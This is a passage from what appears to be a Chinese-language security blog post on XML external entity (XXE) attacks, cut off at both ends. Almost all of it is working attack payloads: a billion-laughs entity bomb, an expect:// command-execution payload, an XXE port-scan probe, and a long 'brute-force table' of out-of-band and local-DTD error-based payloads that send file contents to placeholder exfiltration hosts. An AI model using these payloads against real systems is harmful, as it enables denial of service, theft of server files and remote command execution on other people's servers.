&quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;lolz&gt;&amp;lol9;&lt;&#x2F;lolz&gt;</span><br></pre></td></tr></table></figure><h2 id="3-命令执行"><a href="#3-命令执行" class="headerlink" title="3. 命令执行"></a>3. 命令执行</h2><p>php安装expect扩展可以直接执行系统命令，其他协议也有可能可以执行系统命令。<br>Payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;”1.0″ encoding&#x3D;”utf-8″?&gt;</span><br><span class="line">&lt;!DOCTYPE XXE</span><br><span class="line">&lt;!ELEMENT name ANY &gt;</span><br><span class="line">&lt;!ENTITY XXE SYSTEM &quot;expect:&#x2F;&#x2F;id&quot; &gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;XXE;&lt;&#x2F;name&gt;</span><br><span class="line">&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure><h2 id="4-端口扫描："><a href="#4-端口扫描：" class="headerlink" title="4. 端口扫描："></a>4. 端口扫描：</h2><p>端口开放时会返回报错信息，端口不存在时会无法连接<br>Payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;”1.0″ encoding&#x3D;”utf-8″?&gt;</span><br><span class="line">&lt;!DOCTYPE XXE [</span><br><span class="line">&lt;!ELEMENT name ANY &gt;</span><br><span class="line">&lt;!ENTITY XXE SYSTEM &quot;http:&#x2F;ip:port&quot; &gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;XXE;&lt;&#x2F;name</span><br><span class="line">&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure><h1 id="第五阶段（xxe爆破表）"><a href="#第五阶段（xxe爆破表）" class="headerlink" title="第五阶段（xxe爆破表）"></a>第五阶段（xxe爆破表）</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE x SYSTEM &quot;http:&#x2F;&#x2F;xxe-doctype-system.yourdomain[.]com&#x2F;&quot;&gt;&lt;x &#x2F;&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE x PUBLIC &quot;&quot; &quot;http:&#x2F;&#x2F;xxe-doctype-public.yourdomain[.]com&#x2F;&quot;&gt;&lt;x &#x2F;&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE x [&lt;!ENTITY xxe SYSTEM &quot;http:&#x2F;&#x2F;xxe-entity-system.yourdomain[.]com&#x2F;&quot;&gt;]&gt;&lt;x&gt;&amp;xxe;&lt;&#x2F;x&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE x [&lt;!ENTITY xxe PUBLIC &quot;&quot; &quot;http:&#x2F;&#x2F;xxe-entity-public.yourdomain[.]com&#x2F;&quot;&gt;]&gt;&lt;x&gt;&amp;xxe;&lt;&#x2F;x&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE x [&lt;!ENTITY % xxe SYSTEM &quot;http:&#x2F;&#x2F;xxe-paramentity-system.yourdomain[.]com&#x2F;&quot;&gt;%xxe;]&gt;&lt;x&#x2F;&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE x [&lt;!ENTITY % xxe PUBLIC &quot;&quot; &quot;http:&#x2F;&#x2F;xxe-paramentity-public.yourdomain[.]com&#x2F;&quot;&gt;%xxe;]&gt;&lt;x&#x2F;&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;x xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot; xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;xxe-xsi-schemalocation.yourdomain[.]com&#x2F;&quot;&#x2F;&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;x xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot; xsi:noNamespaceSchemaLocation&#x3D;&quot;http:&#x2F;&#x2F;xxe-xsi-nonamespaceschemalocation.yourdomain[.]com&#x2F;&quot;&#x2F;&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;xs:schema xmlns:xs&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema&quot;&gt;&lt;xs:include schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;xxe-xsinclude-schemalocation.yourdomain[.]com&#x2F;&quot;&#x2F;&gt;&lt;&#x2F;xs:schema&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;xs:schema xmlns:xs&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema&quot;&gt;&lt;xs:include namespace&#x3D;&quot;http:&#x2F;&#x2F;xxe-xsinclude-namespace.yourdomain[.]com&#x2F;&quot;&#x2F;&gt;&lt;&#x2F;xs:schema&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;xs:schema xmlns:xs&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema&quot;&gt;&lt;xs:import schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;xxe-xsimport-schemalocation.yourdomain[.]com&#x2F;&quot;&#x2F;&gt;&lt;&#x2F;xs:schema&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;xs:schema xmlns:xs&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema&quot;&gt;&lt;xs:import namespace&#x3D;&quot;http:&#x2F;&#x2F;xxe-xsimport-namespace.yourdomain[.]com&#x2F;&quot;&#x2F;&gt;&lt;&#x2F;xs:schema&gt;</span><br><span class="line">&lt;?xml-stylesheet href&#x3D;&quot;http:&#x2F;&#x2F;xxe-xml-stylesheet.yourdomain[.]com&#x2F;&quot;?&gt;&lt;x &#x2F;&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;C:\Windows\System32\wbem\xml\cim20.dtd&quot;&gt; &lt;!ENTITY % CIMName &#39;&gt; &lt;!ENTITY &amp;#x25; file SYSTEM &quot;http:&#x2F;&#x2F;exfil-xxe-payload-1.yourdomain[.]com&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;abcxyz&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ELEMENT aa &quot;bb&quot;&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;C:\Windows\System32\wbem\xml\wmi20.dtd&quot;&gt; &lt;!ENTITY % CIMName &#39;&gt; &lt;!ENTITY &amp;#x25; file SYSTEM &quot;http:&#x2F;&#x2F;exfil-xxe-payload-2.yourdomain[.]com&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;abcxyz&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ELEMENT aa &quot;bb&quot;&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;C:\Program Files (x86)\Lotus\Notes\domino.dtd&quot;&gt;&lt;!ENTITY % boolean &#39;(aa) #IMPLIED&gt; &lt;!ENTITY &amp;#x25; file SYSTEM &quot;http:&#x2F;&#x2F;exfil-xxe-payload-3.yourdomain[.]com&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;abcxyz&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ATTLIST attxx aa &quot;bb&quot;&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;C:\Windows\System32\xwizard.dtd&quot;&gt;&lt;!ENTITY % onerrortypes &#39;(aa) #IMPLIED&gt; &lt;!ENTITY &amp;#x25; file SYSTEM &quot;http:&#x2F;&#x2F;exfil-xxe-payload-4.yourdomain[.]com&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;abcxyz&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ATTLIST attxx aa &quot;bb&quot;&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;yelp&#x2F;dtd&#x2F;docbookx.dtd&quot;&gt;&lt;!ENTITY % ISOamsa &#39; &lt;!ENTITY &amp;#x25; file SYSTEM &quot;http:&#x2F;&#x2F;exfil-xxe-payload-5.yourdomain[.]com&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;abcxyz&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;jar:&#x2F;&#x2F;&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;lib&#x2F;jsp-api.jar!&#x2F;javax&#x2F;servlet&#x2F;jsp&#x2F;resources&#x2F;jspxml.dtd&quot;&gt;&lt;!ENTITY % URI &#39;(aa) #IMPLIED&gt; &lt;!ENTITY &amp;#x25; file SYSTEM &quot;http:&#x2F;&#x2F;exfil-xxe-payload-6.yourdomain[.]com&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;abcxyz&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ATTLIST attxx aa &quot;bb&quot;&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;jar:&#x2F;&#x2F;&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;lib&#x2F;tomcat-coyote.jar!&#x2F;org&#x2F;apache&#x2F;tomcat&#x2F;util&#x2F;modeler&#x2F;mbeans-descriptors.dtd&quot;&gt; &lt;!ENTITY % Boolean &#39;(aa) #IMPLIED&gt; &lt;!ENTITY &amp;#x25; file SYSTEM &quot;http:&#x2F;&#x2F;exfil-xxe-payload-7.yourdomain[.]com&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;abcxyz&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ATTLIST attxx aa &quot;bb&quot;&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;xml&#x2F;scrollkeeper&#x2F;dtds&#x2F;scrollkeeper-omf.dtd&quot;&gt; &lt;!ENTITY % url.attribute.set &#39;&gt; &lt;!ENTITY &amp;#x25; file SYSTEM &quot;http:&#x2F;&#x2F;exfil-xxe-payload-8.yourdomain[.]com&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;abcxyz&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ELEMENT aa &quot;bb&quot;&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;xml&#x2F;scrollkeeper&#x2F;dtds&#x2F;scrollkeeper-omf.dtd&quot;&gt; &lt;!ENTITY % url.attribute.set &#39;&gt; &lt;!ENTITY &amp;#x25; file SYSTEM &quot;http:&#x2F;&#x2F;exfil-xxe-payload-8.yourdomain[.]com&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;abcxyz&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ELEMENT aa &quot;bb&quot;&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;opt&#x2F;IBM&#x2F;WebSphere&#x2F;AppServer&#x2F;properties&#x2F;sip-app_1_0.dtd&quot;&gt; &lt;!ENTITY % condition &#39;aaa)&gt; &lt;!ENTITY &amp;#x25; file SYSTEM &quot;http:&#x2F;&#x2F;exfil-xxe-payload-9.yourdomain[.]com&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;abcxyz&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ELEMENT aa (bb&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;xml&#x2F;fontconfig&#x2F;fonts.dtd&quot;&gt; &lt;!ENTITY % constant &#39;aaa)&gt; &lt;!ENTITY &amp;#x25; file SYSTEM &quot;http:&#x2F;&#x2F;exfil-xxe-payload-10.yourdomain[.]com&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;abcxyz&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ELEMENT aa (bb&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;struts&#x2F;struts-config_1_1.dtd&quot;&gt; &lt;!ENTITY % AttributeName &#39;(aa) #IMPLIED&gt; &lt;!ENTITY &amp;#x25; file SYSTEM &quot;http:&#x2F;&#x2F;exfil-xxe-payload-11.yourdomain[.]com&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;abcxyz&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ATTLIST attxx aa &quot;bb&quot;&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;u01&#x2F;oracle&#x2F;wlserver&#x2F;server&#x2F;lib&#x2F;consoleapp&#x2F;webapp&#x2F;WEB-INF&#x2F;struts-config_1_2.dtd&quot;&gt; &lt;!ENTITY % AttributeName &#39;(aa) #IMPLIED&gt; &lt;!ENTITY &amp;#x25; file SYSTEM &quot;http:&#x2F;&#x2F;exfil-xxe-payload-12.yourdomain[.]com&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;abcxyz&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ATTLIST attxx aa &quot;bb&quot;&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;gtksourceview-4&#x2F;language-specs&#x2F;language.dtd&quot;&gt; &lt;!ENTITY % itemattrs &#39;&gt; &lt;!ENTITY &amp;#x25; file SYSTEM &quot;http:&#x2F;&#x2F;exfil-xxe-payload-13.yourdomain[.]com&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;abcxyz&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ELEMENT aa &quot;bb&quot;&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;lib&#x2F;gap&#x2F;pkg&#x2F;GAPDoc-1.6.2&#x2F;bibxmlext.dtd&quot;&gt; &lt;!ENTITY % n.InProceedings &#39;aaa)&gt; &lt;!ENTITY &amp;#x25; file SYSTEM &quot;http:&#x2F;&#x2F;exfil-xxe-payload-14.yourdomain[.]com&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;abcxyz&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ELEMENT aa (bb&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;boostbook&#x2F;dtd&#x2F;boostbook.dtd&quot;&gt; &lt;!ENTITY % boost.common.attrib &#39;&gt; &lt;!ENTITY &amp;#x25; file SYSTEM &quot;http:&#x2F;&#x2F;exfil-xxe-payload-15.yourdomain[.]com&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;abcxyz&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ELEMENT aa &quot;bb&quot;&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;jar:&#x2F;&#x2F;&#x2F;opt&#x2F;jboss&#x2F;wildfly&#x2F;modules&#x2F;system&#x2F;layers&#x2F;base&#x2F;org&#x2F;apache&#x2F;lucene&#x2F;main&#x2F;lucene-queryparser-5.5.5.jar!&#x2F;org&#x2F;apache&#x2F;lucene&#x2F;queryparser&#x2F;xml&#x2F;LuceneCoreQuery.dtd&quot;&gt; &lt;!ENTITY % queries &#39;aaa)&gt; &lt;!ENTITY &amp;#x25; file SYSTEM &quot;http:&#x2F;&#x2F;exfil-xxe-payload-16.yourdomain[.]com&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;abcxyz&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ELEMENT aa (bb&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;jar:&#x2F;&#x2F;&#x2F;opt&#x2F;jboss&#x2F;wildfly&#x2F;modules&#x2F;system&#x2F;layers&#x2F;base&#x2F;org&#x2F;apache&#x2F;xml-resolver&#x2F;main&#x2F;xml-resolver-1.2.jar!&#x2F;org&#x2F;apache&#x2F;xml&#x2F;resolver&#x2F;etc&#x2F;catalog.dtd&quot;&gt; &lt;!ENTITY % publicIdentifier &#39;(aa) #IMPLIED&gt; &lt;!ENTITY &amp;#x25; file SYSTEM &quot;http:&#x2F;&#x2F;exfil-xxe-payload-17.yourdomain[.]com&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;abcxyz&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ATTLIST attxx aa &quot;bb&quot;&#39;&gt; %local_dtd;]&gt;&lt;message&gt;&lt;&#x2F;message&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; standalone&#x3D;&quot;no&quot; ?&gt;&lt;!DOCTYPE message [ 